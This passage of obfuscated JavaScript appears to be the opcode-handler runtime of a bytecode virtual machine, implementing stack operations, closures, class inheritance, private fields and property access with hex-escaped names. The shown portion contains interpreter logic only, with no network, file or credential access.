xP=xR(),xe=xS();if(xP===null){Object['\x73'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xe['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],null),Object['\x73'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xe,Function['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']),xe['_$NN1NaI']=null,Q++;break;}let xE=![];try{let xO=Object['\x63'+'\x72'+'\x65'+'\x61'+'\x74'+'\x65'](xP['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']),xf=xP['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](xO,[]);xf!==undefined&&xf!==xO&&(xE=!![]);}catch(xG){xG instanceof TypeError&&(xG['\x6d'+'\x65'+'\x73'+'\x73'+'\x61'+'\x67'+'\x65']['\x69'+'\x6e'+'\x63'+'\x6c'+'\x75'+'\x64'+'\x65'+'\x73']("'new'")||xG['\x6d'+'\x65'+'\x73'+'\x73'+'\x61'+'\x67'+'\x65']['\x69'+'\x6e'+'\x63'+'\x6c'+'\x75'+'\x64'+'\x65'+'\x73']('constructor')||xG['\x6d'+'\x65'+'\x73'+'\x73'+'\x61'+'\x67'+'\x65']['\x69'+'\x6e'+'\x63'+'\x6c'+'\x75'+'\x64'+'\x65'+'\x73']('Illegal constructor'))&&(xE=!![]);}if(xE){let xF=xe,xv=J_132fec,xa='_$9k6c7p',xt='_$B5x41z',xU='_$superCalled';try{let xN=new Function('ParentClass','vmCtorFunc','vmGlobals','ntKey','ctKey','scKey','let RC = class extends ParentClass {'+'  constructor(...args) {'+'    super(...args);'+'    vmGlobals[scKey] = true;'+'    vmGlobals[ctKey] = new.target || RC;'+'    let hadNt = ntKey in vmGlobals;'+'    if (!hadNt) vmGlobals[ntKey] = new.target;'+'    try {'+'      vmCtorFunc.apply(this, args);'+'    } finally {'+'      delete vmGlobals[scKey];'+'      delete vmGlobals[ctKey];'+'      if (!hadNt) delete vmGlobals[ntKey];'+'    }'+'  }'+'};'+'return RC;')(xP,xF,xv,xa,xt,xU);Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x4e'+'\x61'+'\x6d'+'\x65'+'\x73'](xF)['\x66'+'\x6f'+'\x72'+'\x45'+'\x61'+'\x63'+'\x68'](function(xw){if(xw!=='prototype'&&xw!=='length'&&xw!=='name')try{Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xN,xw,Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x44'+'\x65'+'\x73'+'\x63'+'\x72'+'\x69'+'\x70'+'\x74'+'\x6f'+'\x72'](xF,xw));}catch(xc){}});xF['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']&&(Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x4e'+'\x61'+'\x6d'+'\x65'+'\x73'](xF['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'])['\x66'+'\x6f'+'\x72'+'\x45'+'\x61'+'\x63'+'\x68'](function(xw){if(xw!=='constructor')try{Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xN['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],xw,Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x44'+'\x65'+'\x73'+'\x63'+'\x72'+'\x69'+'\x70'+'\x74'+'\x6f'+'\x72'](xF['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],xw));}catch(xc){}}),Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x53'+'\x79'+'\x6d'+'\x62'+'\x6f'+'\x6c'+'\x73'](xF['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'])['\x66'+'\x6f'+'\x72'+'\x45'+'\x61'+'\x63'+'\x68'](function(xw){try{Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xN['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],xw,Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x44'+'\x65'+'\x73'+'\x63'+'\x72'+'\x69'+'\x70'+'\x74'+'\x6f'+'\x72'](xF['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],xw));}catch(xc){}}));xR(),xx(xN),xN['_$NN1NaI']=xP,Q++;break;}catch(xw){}}Object['\x73'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xe['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],xP['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']),Object['\x73'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xe,xP),xe['_$NN1NaI']=xP,Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=k[xj];if(J_132fec['_$iZ9Ctg']){let xO=J_132fec['_$iZ9Ctg'],xf="get_"+xe,xG=xO['\x67'+'\x65'+'\x74'](xf);if(xG&&xG['\x68'+'\x61'+'\x73'](xP)){let xv=xG['\x67'+'\x65'+'\x74'](xP);xx(xv['\x63'+'\x61'+'\x6c'+'\x6c'](xP)),Q++;break;}let xF=xO['\x67'+'\x65'+'\x74'](xe);if(xF&&xF['\x68'+'\x61'+'\x73'](xP)){xx(xF['\x67'+'\x65'+'\x74'](xP)),Q++;break;}}let xE='_$5nAHRc'+xe['\x73'+'\x75'+'\x62'+'\x73'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67'](0x1)+'_$NTag4F';if(xE in xP){xx(xP[xE]),Q++;break;}throw new TypeError("Cannot read private member "+xe+" from an object whose class did not declare it");break;}},function(xj){while(!![]){let xP=xi(0x3),xe=xi(0x2),xE=xS();xA(0x3,xe),xA(0x2,xE),xb(xP),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=xS(),xO=typeof xE==='function'&&xE['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']?xE['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']:xE;Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xO,xe,{'\x67\x65\x74':xP,'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':xO===xE,'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xj){while(!![]){s[xj]=xR(),Q++;break;}},function(xj){while(!![]){let xP=xR();xx(xP),xx(xP),Q++;break;}},function(xj){while(!![]){let xP=k[xj],xe=xR(),xE=xy['_$h1dVob'];xE&&(xE['_$TDiWlH'][xP]=xe);Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=m(xP),xE=xe&&xe['a'],xO=xe&&xe['s'],xf=xe&&xe['g'],xG=xe&&xe['m'],xF=xy,xv=O,xa=f,xt=G,xU=xe&&xe['ni']!==undefined?xe['c'][xe['ni']]:undefined,xN=xe&&xe['p']||0x0,xw=xE?p:undefined,xc=function(xM,xW,xp,xI,xV,xs,xQ,xk,xh,xL,xz){let xZ,xT;if(xV)xT=function(){let R0=[];for(let R1=0x0;R1<arguments['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'];R1++){R0['\x70'+'\x75'+'\x73'+'\x68'](arguments[R1]);}return xk['\x63'+'\x61'+'\x6c'+'\x6c'](this,xM,R0,xW,xZ);};else xI?xT=async function(){let R0=[];for(let R2=0x0;R2<arguments['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'];R2++){R0['\x70'+'\x75'+'\x73'+'\x68'](arguments[R2]);}let R1=new.target!==undefined?new.target:J_132fec['_$9k6c7p'];return xp?await xQ['\x63'+'\x61'+'\x6c'+'\x6c'](xL,xM,R0,xW,xZ,undefined):await xQ['\x63'+'\x61'+'\x6c'+'\x6c'](this,xM,R0,xW,xZ,R1);}:xT=function(){let R0=[];for(let R2=0x0;R2<arguments['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'];R2++){R0['\x70'+'\x75'+'\x73'+'\x68'](arguments[R2]);}let R1=new.target!==undefined?new.target:J_132fec['_$9k6c7p'];return xp?xs['\x63'+'\x61'+'\x6c'+'\x6c'](xL,xM,R0,xW,xZ,undefined):xs['\x63'+'\x61'+'\x6c'+'\x6c'](this,xM,R0,xW,xZ,R1);};xZ=xT;if(xh)try{Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xZ,'name',{'\x76\x61\x6c\x75\x65':xh,'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]});}catch(R0){}try{Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xZ,'length',{'\x76\x61\x6c\x75\x65':xz,'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]});}catch(R1){}return xZ;}(xP,xF,xE,xO,xf,xv,xa,xt,xU,xw,xN);if(xG)try{Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xc,'prototype',{'\x76\x61\x6c\x75\x65':undefined,'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':![]});}catch(xM){}if(!xc)throw new Error('VM Error: Failed to create closure');xx(xc),Q++;break;}},function(xj){while(!![]){xx(w[xj]),Q++;break;}},function(xj){while(!![]){let xP=xR();if(xP==null)throw new TypeError('Cannot iterate over '+xP);let xe=xP[Symbol['\x69'+'\x74'+'\x65'+'\x72'+'\x61'+'\x74'+'\x6f'+'\x72']];if(typeof xe!=='function')throw new TypeError('Object is not iterable');xx(xe['\x63'+'\x61'+'\x6c'+'\x6c'](xP)),Q++;break;}},function(xj){while(!![]){let xP=k[xj],xe=xR(),xE=xy,xO=![];while(xE){if(xE['_$TDiWlH']&&xP in xE['_$TDiWlH']){if(xE['_$W7Fy6A']&&xP in xE['_$W7Fy6A'])break;xE['_$TDiWlH'][xP]=xe;!xE['_$W7Fy6A']&&(xE['_$W7Fy6A']={});xE['_$W7Fy6A'][xP]=!![],xO=!![];break;}xE=xE['_$h1dVob'];}!xO&&(xy['_$aVHknk']&&xP in xy['_$aVHknk']&&delete xy['_$aVHknk'][xP],xy['_$TDiWlH'][xP]=xe,!xy['_$W7Fy6A']&&(xy['_$W7Fy6A']={}),xy['_$W7Fy6A'][xP]=!![]);Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=xj,xO=function(xf,xG,xF){let xv;return xF?xv=function(){if(xG){J_132fec['_$B5x41z']=xv;let xa='_$9k6c7p'in J_132fec;!xa&&(J_132fec['_$9k6c7p']=new.target);try{let xt=[];for(let xU=0x0;xU<arguments['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'];xU++){xt['\x70'+'\x75'+'\x73'+'\x68'](arguments[xU]);}return xG['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](this,xt);}finally{delete J_132fec['_$B5x41z'],!xa&&delete J_132fec['_$9k6c7p'];}}}:xv=function(){if(xG){let xa='_$9k6c7p'in J_132fec;!xa&&(J_132fec['_$9k6c7p']=new.target);try{let xt=[];for(let xU=0x0;xU<arguments['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'];xU++){xt['\x70'+'\x75'+'\x73'+'\x68'](arguments[xU]);}return xG['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](this,xt);}finally{!xa&&delete J_132fec['_$9k6c7p'];}}},xv;}(xP,xe,xE);xP&&Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xO,'name',{'\x76\x61\x6c\x75\x65':xP,'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]});xx(xO),Q++;break;}},function(xj){while(!![]){return V>0x0?xR():undefined;break;}},function(xj){while(!![]){let xP=s[xj]+0x1;s[xj]=xP,xx(xP),Q++;break;}},function(xj){while(!![]){let xP=xS();xb(xi(0x2)),xA(0x2,xP),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=J_132fec['_$pa13eK'],xO;if(xE)xO=Object['\x67'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xE);else{if(typeof xe==='function')xO=Object['\x67'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xe);else{let xv=Object['\x67'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xe),xa=xv&&xv['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']&&xv['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']===xv;xa?xO=Object['\x67'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xv):xO=xv;}}let xf=null,xG=xO;while(xG!==null){xf=Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x44'+'\x65'+'\x73'+'\x63'+'\x72'+'\x69'+'\x70'+'\x74'+'\x6f'+'\x72'](xG,xP);if(xf)break;xG=Object['\x67'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xG);}let xF;if(xf&&xf['\x67'+'\x65'+'\x74'])xF=xf['\x67'+'\x65'+'\x74']['\x63'+'\x61'+'\x6c'+'\x6c'](xe),xx(xF);else{if(xf&&xf['\x73'+'\x65'+'\x74']&&!('value'in xf))xx(undefined);else{xF=xG?xG[xP]:xO[xP];if(typeof xF==='function'){let xt=xG||xO,xU=xF['\x62'+'\x69'+'\x6e'+'\x64'](xe),xN=xF['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']&&xF['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']['\x6e'+'\x61'+'\x6d'+'\x65'],xw=xN==='GeneratorFunction'||xN==='AsyncFunction'||xN==='AsyncGeneratorFunction';!xw&&(!J_132fec['_$vhcgFV']&&(J_132fec['_$vhcgFV']=new WeakMap()),J_132fec['_$vhcgFV']['\x73'+'\x65'+'\x74'](xU,xt)),xx(xU);}else xx(xF);}}Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe==xP),Q++;break;}},function(xj){while(!![]){let xP=k[xj],xe=xy,xE,xO=![],xf=xP['\x69'+'\x6e'+'\x64'+'\x65'+'\x78'+'\x4f'+'\x66']('$$')!==-0x1?xP['\x73'+'\x70'+'\x6c'+'\x69'+'\x74']('$$')[0x0]:xP;while(xe){if(xe['_$aVHknk']&&xP in xe['_$aVHknk'])throw new ReferenceError("Cannot access '"+xP+"' before initialization");if(xf!==xP&&xe['_$aVHknk']&&xf in xe['_$aVHknk']){if(!(xe['_$TDiWlH']&&xP in xe['_$TDiWlH']))throw new ReferenceError("Cannot access '"+xf+"' before initialization");}if(xe['_$TDiWlH']&&xP in xe['_$TDiWlH']){xE=xe['_$TDiWlH'][xP],xO=!![];break;}xe=xe['_$h1dVob'];}xP==='__this__'&&(xE=p,xO=!![]);!xO&&(xP in J_132fec?xE=J_132fec[xP]:xE=H[xP]);xx(xE),Q++;break;}},function(xj){while(!![]){let xP=k[xj];xx(Symbol['\x66'+'\x6f'+'\x72'](xP)),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=k[xj],xE=!(xe in J_132fec)&&!(xe in H);J_132fec[xe]=xP;xe in H&&(H[xe]=xP);xE&&(H[xe]=xP);xx(xP),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe/xP),Q++;break;}},function(xj){while(!![]){let xP=xR();if(xP==null)throw new TypeError('Cannot iterate over '+xP);let xe=xP[Symbol['\x61'+'\x73'+'\x79'+'\x6e'+'\x63'+'\x49'+'\x74'+'\x65'+'\x72'+'\x61'+'\x74'+'\x6f'+'\x72']];if(typeof xe==='function')xx(xe['\x63'+'\x61'+'\x6c'+'\x6c'](xP));else{let xE=xP[Symbol['\x69'+'\x74'+'\x65'+'\x72'+'\x61'+'\x74'+'\x6f'+'\x72']];if(typeof xE!=='function')throw new TypeError('Object is not async iterable');xx(xE['\x63'+'\x61'+'\x6c'+'\x6c'](xP));}Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe*xP),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=k[xj];!J_132fec['_$iZ9Ctg']&&(J_132fec['_$iZ9Ctg']=new Map());let xE=J_132fec['_$iZ9Ctg'],xO="get_"+xe,xf=xE['\x67'+'\x65'+'\x74'](xO);if(xf&&xf['\x68'+'\x61'+'\x73'](xP)){let xa=xf['\x67'+'\x65'+'\x74'](xP);xx(xa['\x63'+'\x61'+'\x6c'+'\x6c'](xP)),Q++;break;}let xG='_$HnpK5c'+"get_"+xe['\x73'+'\x75'+'\x62'+'\x73'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67'](0x1)+'_$7iRR7j';if(xP['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']&&xG in xP['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']){let xt=xP['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72'][xG];xx(xt['\x63'+'\x61'+'\x6c'+'\x6c'](xP)),Q++;break;}let xF=xE['\x67'+'\x65'+'\x74'](xe);if(xF&&xF['\x68'+'\x61'+'\x73'](xP)){xx(xF['\x67'+'\x65'+'\x74'](xP)),Q++;break;}let xv='_$5nAHRc'+xe['\x73'+'\x75'+'\x62'+'\x73'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67'](0x1)+'_$NTag4F';if(xv in xP){xx(xP[xv]),Q++;break;}throw new TypeError("Cannot read private member "+xe+" from an object whose class did not declare it");break;}},function(xj){while(!![]){let xP=k[xj],xe;if(xP in J_132fec)xe=J_132fec[xP];else{if(xP in H)xe=H[xP];else throw new ReferenceError(xP+' is not defined');}xx(xe),Q++;break;}},function(xj){while(!![]){throw xR();break;}},function(xj){while(!![]){let xP=xR(),xe=xS();xP!==null&&xP!==undefined&&Object['\x61'+'\x73'+'\x73'+'\x69'+'\x67'+'\x6e'](xe,xP);Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe in xP),Q++;break;}},function(xj){while(!![]){xx(-xR()),Q++;break;}},function(xj){while(!![]){let xP=xR();xx(!!xP['\x64'+'\x6f'+'\x6e'+'\x65']),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(Math['\x70'+'\x6f'+'\x77'](xe,xP)),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe%xP),Q++;break;}},function(xj){while(!![]){xx(W),Q++;break;}},function(xj){while(!![]){xx(k[xj]),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=k[xj];if(xe===null||xe===undefined)throw new TypeError("Cannot set property '"+String(xE)+"' of "+xe);x5?xe[xE]=xP:Reflect['\x73'+'\x65'+'\x74'](xe,xE,xP);xx(xP),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe!=xP),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe-xP),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xS();if(Array['\x69'+'\x73'+'\x41'+'\x72'+'\x72'+'\x61'+'\x79'](xP))Array['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']['\x70'+'\x75'+'\x73'+'\x68']['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](xe,xP);else for(let xE of xP){xe['\x70'+'\x75'+'\x73'+'\x68'](xE);}Q++;break;}},function(xj){while(!![]){!xR()?Q=xY(L[Q]):Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=k[xj],xE=![];if(J_132fec['_$iZ9Ctg']){let xO=J_132fec['_$iZ9Ctg'],xf=xO['\x67'+'\x65'+'\x74'](xe);xE=xf&&xf['\x68'+'\x61'+'\x73'](xP);}xx(xE),Q++;break;}},function(xj){while(!![]){xx(xy),Q++;break;}},function(xj){while(!![]){let xP=xj&0xffff,xe=xj>>0x10,xE=k[xP],xO=k[xe];xx(new RegExp(xE,xO)),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe>>>xP),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xe===null||xe===undefined?xx(undefined):xx(xe[xP]);Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe>xP),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=l(xR,xP),xE=xR();if(typeof xE!=='function')throw new TypeError(xE+' is not a constructor');let xO=J_132fec['_$pa13eK'];J_132fec['_$pa13eK']=undefined;let xf;try{xf=Reflect['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'](xE,xe);}finally{J_132fec['_$pa13eK']=xO;}xx(xf),Q++;break;}},function(xj){while(!![]){let xP=k[xj],xe=xR();if(xy['_$aVHknk']){xP in xy['_$aVHknk']&&delete xy['_$aVHknk'][xP];let xE=xP['\x73'+'\x70'+'\x6c'+'\x69'+'\x74']('$$')[0x0];xE!==xP&&xE in xy['_$aVHknk']&&delete xy['_$aVHknk'][xE];}xy['_$TDiWlH'][xP]=xe,Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=xS();Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xE,xe,{'\x73\x65\x74':xP,'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=xR();if(xE===null||xE===undefined)throw new TypeError("Cannot set property '"+String(xe)+"' of "+xE);x5?xE[xe]=xP:Reflect['\x73'+'\x65'+'\x74'](xE,xe,xP);xx(xP),Q++;break;}},function(xj){while(!![]){if(T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']>0x0){let xP=T[T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']-0x1];if(xP['_$I5WncY']!==undefined){x1['_$BLHqcK']=!![],x1['_$hG5yMT']=xR(),Q=xP['_$I5WncY'];break;}}x1['_$BLHqcK']&&(x1['_$BLHqcK']=![],x1['_$hG5yMT']=undefined);xJ=!![],xH=xR();return;break;}},function(xj){while(!![]){let xP=xR(),xe=k[xj];if(xP==null){xx(undefined),Q++;break;}!J_132fec['_$iZ9Ctg']&&(J_132fec['_$iZ9Ctg']=new Map());let xE=J_132fec['_$iZ9Ctg'],xO=xE['\x67'+'\x65'+'\x74'](xe);if(!xO||!xO['\x68'+'\x61'+'\x73'](xP))throw new TypeError("Cannot read private member "+xe+" from an object whose class did not declare it");xx(xO['\x67'+'\x65'+'\x74'](xP)),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe+xP),Q++;break;}},function(xj){while(!![]){let xP=xS();xP['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']++,Q++;break;}},function(xj){while(!![]){xx(typeof xR()),Q++;break;}},function(xj){while(!![]){Q=xY(L[Q]);break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=k[xj];!J_132fec['_$iZ9Ctg']&&(J_132fec['_$iZ9Ctg']=new Map());let xO=J_132fec['_$iZ9Ctg'];!xO['\x68'+'\x61'+'\x73'](xE)&&xO['\x73'+'\x65'+'\x74'](xE,new WeakMap());let xf=xO['\x67'+'\x65'+'\x74'](xE);if(xf['\x68'+'\x61'+'\x73'](xe))throw new TypeError("Cannot initialize "+xE+" twice on the same object");xf['\x73'+'\x65'+'\x74'](xe,xP),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe^xP),Q++;break;}},function(xj){while(!![]){let xP=k[xj],xe=xR();if(xy['_$aVHknk']){xP in xy['_$aVHknk']&&delete xy['_$aVHknk'][xP];let xE=xP['\x73'+'\x70'+'\x6c'+'\x69'+'\x74']('$$')[0x0];xE!==xP&&xE in xy['_$aVHknk']&&delete xy['_$aVHknk'][xE];}xy['_$TDiWlH'][xP]=xe;!xy['_$W7Fy6A']&&(xy['_$W7Fy6A']={});xy['_$W7Fy6A'][xP]=!![],Q++;break;}},function(xj){while(!![]){let xP=xR();xP&&typeof xP['\x72'+'\x65'+'\x74'+'\x75'+'\x72'+'\x6e']==='function'?xx(Promise['\x72'+'\x65'+'\x73'+'\x6f'+'\x6c'+'\x76'+'\x65'](xP['\x72'+'\x65'+'\x74'+'\x75'+'\x72'+'\x6e']())):xx(Promise['\x72'+'\x65'+'\x73'+'\x6f'+'\x6c'+'\x76'+'\x65']());Q++;break;}},function(xj){while(!![]){xx(p),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=xR();if(typeof xe!=='function')throw new TypeError(xe+' is not a function');let xO=J_132fec['_$vhcgFV'],xf=xO&&xO['\x67'+'\x65'+'\x74'](xe),xG=J_132fec['_$pa13eK'];xf&&(J_132fec['_$Vu3Kng']=!![],J_132fec['_$pa13eK']=xf);try{let xF=xe['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](xE,l(xR,xP));xx(xF);}finally{xf&&(J_132fec['_$Vu3Kng']=![],J_132fec['_$pa13eK']=xG);}Q++;break;}},function(xj){while(!![]){if(T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']>0x0){let xP=T[T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']-0x1];if(xP['_$I5WncY']!==undefined){x2['_$vjufYF']=!![],x2['_$cL1ahp']=xY(L[Q]),Q=xP['_$I5WncY'];break;}}Q=xY(L[Q]);break;}},function(xj){while(!![]){xx(s[xj]),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=l(xR,xP),xE=xR();if(xj===0x1){xx(xe),Q++;break;}if(J_132fec['_$superCalled']){Q++;break;}if(typeof xE!=='function')throw new TypeError('Super expression must be 